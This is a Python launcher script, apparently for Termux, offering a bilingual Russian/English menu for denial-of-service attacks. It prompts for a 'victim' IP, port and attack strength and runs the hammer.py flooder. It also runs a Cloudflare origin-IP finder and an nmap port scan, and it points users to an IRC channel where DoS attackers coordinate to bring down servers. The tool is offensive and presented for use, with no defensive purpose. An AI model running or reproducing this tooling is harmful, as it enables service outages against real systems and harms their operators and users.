import os
import subprocess
from colorama import Fore, Back, Style

def cls():
    os.system('cls' if os.name=='nt' else 'clear')

cls()
print(Fore.GREEN + "")

print(" ____       ____       _____       ____     ")
print("/\  _`\    /\  _`\    /\  __`\    /\  _`\     ")
print("\ \ \/\ \  \ \ \/\ \  \ \ \/\ \   \ \,\L\_\ ")
print(" \ \ \ \ \  \ \ \ \ \  \ \ \ \ \   \/_\__ \ ")
print("  \ \ \_\ \  \ \ \_\ \  \ \ \_\ \    /\ \L\ \ ")
print("   \ \____/   \ \____/   \ \_____\   \ `\____\ ")
print("    \/___/     \/___/     \/_____/    \/_____/ ")   
print(" ")
print(Fore.CYAN + " by @wannadeauth | @wannadeauth_chat (telegram)")
print("-------------------------------------------------")
print(" ")   
print(Fore.YELLOW +  " [1] Start attack | Начать атаку")
print(Fore.WHITE + "")
print(" [2] Узнать айпи домена, cloudflare cracker domens ip")
print(Fore.RED + "")                             
print(" [3] Сканировать порты | Scan open ports")
print(Fore.BLUE + " ")                                                    
print(" [4] Чат с DoS-ерами прямо не выходя из Termux, вы можете действовать слаженно")
print("     чтобы повалить сильный сервер |")
print("   ")
print("    |  Chat with other attackers without leaving Termux, you can attack together,")
print("     to bring down a strong server.")
print(Fore.GREEN + "")
a = input(" Write parametr | Введите параметр : ")
                      

if a == "1":
    ip = input("Введите ip адрес жертвы | Type ip adress of victim: ")
    port = input("Введите порт | Port: ")
    strong = input("Кол-во потоков (сила) | Current/strong of attack \n Желательно от 150 до 700 | Preferably in range of 150 700: ")

    list_files = subprocess.run(["python", "hammer.py" ,"-s"  , ip , "-p" , port , "-t" , strong])


elif a == "2":
    list_files = subprocess.run(["python", "cloud_killer.py"])

elif a == "3":
    ip1 = input("Введите ip адрес для сканирования | Type ip for scanning ports: ")
    port1 = input("Введите порты | Write ports \n Пример | Example 21-80,443,7777,8080: ")
    list_files = subprocess.run(["nmap" , "-sV" , ip1 , "-p" , port1])

elif a == "4":
    cls()
    print(Fore.GREEN + "")

    print(" ____       ____       _____       ____     ")
    print("/\  _`\    /\  _`\    /\  __`\    /\  _`\     ")
    print("\ \ \/\ \  \ \ \/\ \  \ \ \/\ \   \ \,\L\_\ ")
    print(" \ \ \ \ \  \ \ \ \ \  \ \ \ \ \   \/_\__ \ ")
    print("  \ \ \_\ \  \ \ \_\ \  \ \ \_\ \    /\ \L\ \ ")
    print("   \ \____/   \ \____/   \ \_____\   \ `\____\ ")
    print("    \/___/     \/___/     \/_____/    \/_____/ ")                                
    print(" ")
    print(Fore.CYAN + " by @wannadeauth | @wannadeauth_chat (telegram)")
    print("-------------------------------------------------")
    print(Fore.WHITE + " ")
    print("  В открывшемся окне, после Irssi, пишем такие команды: ")
    print(Fore.RED + " ")
    print("     /connect chat.freenode.com") 
    print("   ")
    print("     /join doser")
    print(Fore.WHITE + " ")
    print("Все! Вы в чате!!!")
    print(" ")
    print(Fore.YELLOW + " ")

    print(" [1] Irssi")
    print(" ")
    print(" [2] Установить модуль Irssi")
    print(" ")
    print(Fore.GREEN + " ")
    b = input("Выберите действие: ")
    if b == "2":

        list_files = subprocess.run(["apt-get" , "install" , "irssi"])
    if b == "1":
        list_files = subprocess.run(["irssi"])

else:
    print("Задана неверная функция | Wrong fuction has been setup")






